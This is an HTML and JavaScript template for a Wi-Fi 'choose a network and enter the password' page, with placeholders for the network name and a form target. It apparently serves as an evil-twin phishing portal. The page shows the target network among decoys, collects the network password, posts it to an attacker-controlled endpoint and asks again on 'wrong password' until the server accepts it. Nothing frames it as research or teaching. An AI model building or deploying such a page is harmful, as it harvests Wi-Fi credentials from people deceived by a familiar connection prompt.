<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="color-scheme" content="light">
<title>{{TITLE}}</title>
<style>
  :root{
    --accent:#2563eb;--accent-d:#1d4fd0;--ink:#14171d;--muted:#6b7280;
    --bg:#f4f5f7;--card:#fff;--line:#e0e3e8;--bad:#c62f22;--ok:#1f7a45;
  }
  *{box-sizing:border-box}
  html,body{margin:0}
  body{
    min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:26px 16px;
    background:var(--bg);color:var(--ink);
    font:16px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    -webkit-text-size-adjust:100%;
  }
  .card{width:100%;max-width:392px;background:var(--card);border-radius:12px;border:1px solid var(--line);padding:22px 22px 22px}
  .top{display:flex;align-items:center;gap:9px;padding-bottom:18px;border-bottom:1px solid var(--line);margin-bottom:20px}
  .top svg{display:block;flex:none}
  .top b{font-size:13px;font-weight:600;letter-spacing:.6px;text-transform:uppercase;color:#3b4250}
  .step{margin-left:auto;font-size:12px;color:var(--muted);font-variant-numeric:tabular-nums}
  h1{margin:0 0 6px;font-size:21px;line-height:1.25;font-weight:600}
  .sub{margin:0 0 18px;font-size:14px;color:var(--muted)}
  .sub b{color:var(--ink);font-weight:600;word-break:break-word}
  .nets{display:flex;flex-direction:column;gap:8px;margin:0 0 16px}
  .net{
    display:flex;align-items:center;gap:11px;min-height:52px;padding:0 13px;
    border:1px solid var(--line);border-radius:10px;cursor:pointer;background:#fff;
    transition:border-color .15s,background .15s;
  }
  .net:hover{border-color:#c4cbd6}
  .net:has(input:checked){border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset;background:#f5f8ff}
  .net input{position:absolute;opacity:0;width:1px;height:1px}
  .net .nm{flex:1 1 auto;min-width:0;font-size:15px;font-weight:500;word-break:break-word}
  .net .lock{flex:none;color:var(--muted)}
  .net .dot{
    flex:none;width:18px;height:18px;border-radius:50%;border:2px solid #c3cad5;position:relative;
  }
  .net input:checked ~ .dot{border-color:var(--accent)}
  .net input:checked ~ .dot::after{
    content:"";position:absolute;inset:3px;border-radius:50%;background:var(--accent);
  }
  .net input:focus-visible ~ .dot{box-shadow:0 0 0 3px rgba(37,99,235,.22)}
  label.fl{display:block;font-size:13px;font-weight:600;color:#3b4250;margin-bottom:7px}
  input[type=password]{
    display:block;width:100%;height:48px;padding:0 13px;font-size:16px;color:var(--ink);
    background:#fff;border:1px solid var(--line);border-radius:10px;outline:none;
    transition:border-color .15s,box-shadow .15s;
  }
  input[type=password]:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(37,99,235,.16)}
  input[aria-invalid="true"]{border-color:var(--bad)}
  .err{margin:6px 0 0;min-height:16px;font-size:12.5px;color:var(--bad)}
  button{
    width:100%;min-height:48px;margin-top:12px;display:inline-flex;align-items:center;justify-content:center;gap:9px;
    font:600 16px/1 inherit;color:#fff;background:var(--accent);border:0;border-radius:10px;cursor:pointer;
    transition:background .15s,opacity .15s;
  }
  button:hover{background:var(--accent-d)}
  button:disabled{opacity:.72;cursor:default}
  .spin{
    width:16px;height:16px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;
    display:none;animation:r .7s linear infinite;
  }
  button.busy .spin{display:block}
  @keyframes r{to{transform:rotate(360deg)}}
  .back{
    display:inline-flex;align-items:center;gap:6px;min-height:44px;margin-top:6px;
    font-size:13.5px;color:var(--muted);text-decoration:none;
  }
  .back:hover{color:var(--ink)}
  .note{margin:12px 0 0;min-height:18px;font-size:13px;color:var(--muted);text-align:center}
  .note.bad{color:var(--bad);font-weight:600}
  .done{text-align:center;padding:10px 0 6px}
  .done svg{display:block;margin:0 auto 14px}
  .done h2{margin:0 0 8px;font-size:20px}
  .done p{margin:0;font-size:14px;color:var(--muted)}
  [hidden]{display:none!important}
</style>
</head>
<body>
<main class="card">
  <div class="top">
    <svg width="20" height="20" viewBox="0 0 20 20" aria-hidden="true">
      <path d="M2.6 7.3c4.1-3.7 10.7-3.7 14.8 0" fill="none" stroke="#2563eb" stroke-width="1.9" stroke-linecap="round"/>
      <path d="M5.7 10.7c2.4-2.2 6.2-2.2 8.6 0" fill="none" stroke="#2563eb" stroke-width="1.9" stroke-linecap="round"/>
      <circle cx="10" cy="14.2" r="1.5" fill="#2563eb"/>
    </svg>
    <b>Wi-Fi</b>
    <span class="step" id="step">1 / 2</span>
  </div>

  <!-- шаг 1 -->
  <section id="s1">
    <h1>Choose a network</h1>
    <p class="sub">Select the network you want to join. Secure networks ask for a password next.</p>

    <div class="nets" role="radiogroup" aria-label="Available networks">
      <label class="net">
        <input type="radio" name="ssid" value="{{SSID}}" checked>
        <span class="nm">{{SSID}}</span>
        <span class="lock"><svg width="14" height="14" viewBox="0 0 14 14" aria-hidden="true"><rect x="2.6" y="6" width="8.8" height="6.2" rx="1.2" fill="none" stroke="currentColor" stroke-width="1.4"/><path d="M4.6 6V4.6a2.4 2.4 0 014.8 0V6" fill="none" stroke="currentColor" stroke-width="1.4"/></svg></span>
        <span class="dot"></span>
      </label>
      <label class="net">
        <input type="radio" name="ssid" value="Neighbour-5G">
        <span class="nm">Neighbour-5G</span>
        <span class="lock"><svg width="14" height="14" viewBox="0 0 14 14" aria-hidden="true"><rect x="2.6" y="6" width="8.8" height="6.2" rx="1.2" fill="none" stroke="currentColor" stroke-width="1.4"/><path d="M4.6 6V4.6a2.4 2.4 0 014.8 0V6" fill="none" stroke="currentColor" stroke-width="1.4"/></svg></span>
        <span class="dot"></span>
      </label>
      <label class="net">
        <input type="radio" name="ssid" value="Guest-2.4">
        <span class="nm">Guest-2.4</span>
        <span class="lock"><svg width="14" height="14" viewBox="0 0 14 14" aria-hidden="true"><rect x="2.6" y="6" width="8.8" height="6.2" rx="1.2" fill="none" stroke="currentColor" stroke-width="1.4"/><path d="M4.6 6V4.6a2.4 2.4 0 014.8 0V6" fill="none" stroke="currentColor" stroke-width="1.4"/></svg></span>
        <span class="dot"></span>
      </label>
      <label class="net">
        <input type="radio" name="ssid" value="TP-Link_4C21">
        <span class="nm">TP-Link_4C21</span>
        <span class="dot"></span>
      </label>
    </div>

    <button id="next" type="button">Continue</button>
  </section>

  <!-- шаг 2 -->
  <section id="s2" hidden>
    <h1>Enter the password</h1>
    <p class="sub">Network <b id="pick">{{SSID}}</b>. The password is case-sensitive.</p>

    <form id="f" novalidate autocomplete="off">
      <input type="hidden" name="ssid" id="ssid" value="{{SSID}}">
      <label class="fl" for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Network password"
             spellcheck="false" autocapitalize="none" autocomplete="off" aria-describedby="e-password">
      <p class="err" id="e-password" aria-live="polite"></p>
      <button id="go" type="submit"><span class="spin" aria-hidden="true"></span><span class="lbl">Connect</span></button>
    </form>

    <p class="note" id="note" role="status" aria-live="polite"></p>
    <a class="back" href="/" id="back">
      <svg width="12" height="12" viewBox="0 0 12 12" aria-hidden="true"><path d="M7.5 2.2L3.7 6l3.8 3.8" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Back to networks
    </a>
  </section>

  <section class="done" id="done" hidden>
    <svg width="44" height="44" viewBox="0 0 44 44" aria-hidden="true">
      <circle cx="22" cy="22" r="21" fill="#eaf3ec"/>
      <path d="M14.5 22.4l5.3 5.3 9.7-10.4" fill="none" stroke="#1f7a45" stroke-width="2.6"
            stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <h2>Connected</h2>
    <p>You are online. You can close this window.</p>
  </section>
</main>

<script>
(function () {
  var s1 = document.getElementById('s1');
  var s2 = document.getElementById('s2');
  var done = document.getElementById('done');
  var stepChip = document.getElementById('step');
  var next = document.getElementById('next');
  var form = document.getElementById('f');
  var input = document.getElementById('password');
  var btn = document.getElementById('go');
  var label = btn.querySelector('.lbl');
  var note = document.getElementById('note');
  var pick = document.getElementById('pick');
  var ssidField = document.getElementById('ssid');
  var busy = false;
  var timer = 0;

  function chosen() {
    var r = document.querySelector('input[name="ssid"]:checked');
    return r ? r.value : '';
  }

  function toStep2(push) {
    pick.textContent = chosen();
    ssidField.value = chosen();
    s1.hidden = true;
    s2.hidden = false;
    stepChip.textContent = '2 / 2';
    if (push && location.pathname !== '/step') {
      try { history.pushState({ step: 2 }, '', '/step'); } catch (e) {}
    }
    input.focus({ preventScroll: true });
  }

  function toStep1() {
    s2.hidden = true;
    s1.hidden = false;
    stepChip.textContent = '1 / 2';
  }

  next.addEventListener('click', function () {
    if (!chosen()) return;
    toStep2(true);
  });

  document.getElementById('back').addEventListener('click', function (ev) {
    ev.preventDefault();
    try { history.pushState({ step: 1 }, '', '/'); } catch (e) {}
    toStep1();
  });

  window.addEventListener('popstate', function () {
    if (location.pathname === '/' || location.pathname === '') toStep1();
    else if (location.pathname.indexOf('/step') === 0) toStep2(false);
  });

  if (location.pathname.indexOf('/step') === 0) toStep2(false);

  function setError(msg) {
    document.getElementById('e-password').textContent = msg || '';
    input.setAttribute('aria-invalid', msg ? 'true' : 'false');
  }

  function state(bad, text) {
    note.textContent = text || '';
    note.className = 'note' + (bad ? ' bad' : '');
  }

  function setBusy(on) {
    busy = on;
    btn.disabled = on;
    btn.classList.toggle('busy', on);
    label.textContent = on ? 'Checking…' : 'Connect';
  }

  form.addEventListener('submit', function (ev) {
    ev.preventDefault();
    if (busy) return;
    clearTimeout(timer);
    if (!input.value.trim()) {
      setError('Enter the network password');
      input.focus();
      return;
    }
    setError('');
    state(false, '');
    setBusy(true);

    var data = {};
    new FormData(form).forEach(function (v, k) { data[k] = String(v); });

    fetch('{{ACTION}}', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
      .then(function (r) { return r.json(); })
      .then(function (res) {
        var verdict = (res && res.verdict) || 'pending';
        if (verdict === 'ok') {
          s1.hidden = true;
          s2.hidden = true;
          stepChip.textContent = '2 / 2';
          state(false, '');
          done.hidden = false;
          return;
        }
        if (verdict === 'retry') {
          setBusy(false);
          state(true, 'Wrong password. Check the spelling and try again.');
          input.select();
          return;
        }
        state(false, 'Checking the password, reconnecting…');
        timer = setTimeout(function () {
          setBusy(false);
          state(false, 'If the window does not close by itself, press Connect again.');
        }, 4000);
      })
      .catch(function () {
        setBusy(false);
        state(true, 'The network did not answer. Please try again.');
      });
  });
})();
</script>
</body>
</html>
